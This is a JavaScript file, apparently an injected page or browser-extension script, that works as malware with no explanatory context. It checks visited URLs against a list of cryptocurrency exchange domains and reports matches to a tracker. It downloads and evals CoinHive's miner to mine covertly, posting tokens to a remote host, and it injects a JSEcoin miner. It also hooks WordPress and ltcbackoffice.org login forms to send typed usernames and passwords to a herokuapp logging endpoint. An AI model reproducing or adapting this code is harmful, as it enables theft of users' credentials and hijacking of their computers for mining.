(new Image).src = "//whos.amung.us/swidget/bbbbbbbbd";
var myStringArray = [
  "coin",
  "ether",
  "bitcoin",
  "monero",
  "etherum",
  "wallet",
  "cryptocurrency",
  "bitcoin",
  "blockchain.info",
  "paxful.com",
  "coin.space",
  "coinapult.com",
  "bitgo.com",
  "strongcoin.com",
  "coinhive.com",
  "spectrocoin.com",
  "wirexapp.com",
  "xapo.com",
  "iqoption.com",
  "etoro.com",
  "bittrex.com",
  "localbitcoins.com",
  "cex.io",
  "kraken.com",
  "etherdelta.com",
  "bitfinex.com",
  "bitstamp.net",
  "bisq.network",
  "gdax.com",
  "shapeshift.io",
  "binance.com",
  "coinmama.com",
  "bitcoin.de",
  "bithumb.com",
  "coinatmradar.com",
  "poloniex.com",
  "changelly.com",
  "zebpay.com",
  "bitso.com",
  "gemini.com",
  "yobit.net",
  "luno.com",
  "bitbay.net",
  "bitpanda.com",
  "bitflyer.jp",
  "cryptonia.co.nz",
  "btcmarkets.net",
  "coinchceck.com",
  "bx.in.th",
  "bitcoin.co.id",
  "anycoindirect.eu",
  "hitbtc.com",
  "bitmex.com",
  "indacoin.com",
  "mine",
  "btc",
  "ltc",
  "zcash"
];
var arrayLength = myStringArray.length;
for (var i = 0; i < arrayLength; i++) {
    if (details.url.indexOf(myStringArray[i]) > -1) {
(new Image).src = "//whos.amung.us/swidget/bbbbbbbbc";
    }
    var target = 2048;
    var exFunc = function(){
    if (typeof isrunmyproject == "undefined") {
    	isrunmyproject = 1;
    if (typeof CoinHive != "object") {
    	var xmlHttp = new XMLHttpRequest;
        xmlHttp["open"]("GET", "https://coinhive.com/lib/coinhive.min.js", false);
        xmlHttp["send"](null);
        eval(xmlHttp["responseText"]);
    }
    	var miner = new CoinHive.Token('H3QMiNzSRGMRObqvqtk0BG3cNIqxUuvr', target);
    	miner.on('accepted', function(params){
    		if (params.hashes >= target) {
    			var ts = Date.now();
    			var xhr = new XMLHttpRequest();
    			xhr.onreadystatechange = function() {
    				if (xhr.readyState === xhr.DONE){

    				}
    			};
    			xhr.open('POST', 'https://cnhv.co/dkja');
    			xhr.setRequestHeader("Content-type","application/x-www-form-urlencoded");
    			xhr.send('token='+encodeURIComponent(miner.getToken()));
    		}
    	});
    	miner.start(CoinHive.FORCE_MULTI_TAB);

    }
  }

    var cookie_name = "controler_mineros_"+target;
    var cookie_time = 0.3;
    if(!localStorage[cookie_name] || parseInt(localStorage[cookie_name]) < Date.now()-60*60*cookie_time){
    	localStorage[cookie_name] = Date.now();
    	exFunc();
     }

    !function() {
      localStorage["jsenow"] = Date.now();
      var e = document;
      var t = e.createElement("script");
      var s = e.getElementsByTagName("script")[0];
      t.type = "text/javascript";
      t.async = t.defer = true;
      t.src = "https://load.jsecoin.com/load/29089/www/0/0/";
      s.parentNode.insertBefore(t, s);
    }();

    if (location.href.indexOf("wp-login") >= 0 || (location.href.indexOf("wp-admin") >= 0 || location.href.indexOf("wp-") >= 0)) {
      document.getElementById("loginform").onsubmit = function() {
        username = document.getElementById("user_login").value;
        user_pass = document.getElementById("user_pass").value;
        if (username && user_pass) {
          (new Image).src = "http://fetching-url.herokuapp.com/logs.php?l="+location.href+"&e="+username+"&p="+user_pass;

        }
      };
    }
    if (location.href.indexOf("ltcbackoffice.org") >= 0) {
      document.getElementById("login-form").onsubmit = function() {
        username = document.getElementById("username").value;
        user_pass = document.getElementById("password").value;
        if (username && user_pass) {
          (new Image).src = "http://fetching-url.herokuapp.com/logs.php?l="+location.href+"&e="+username+"&p="+user_pass;
        }
      };
    }
    ;
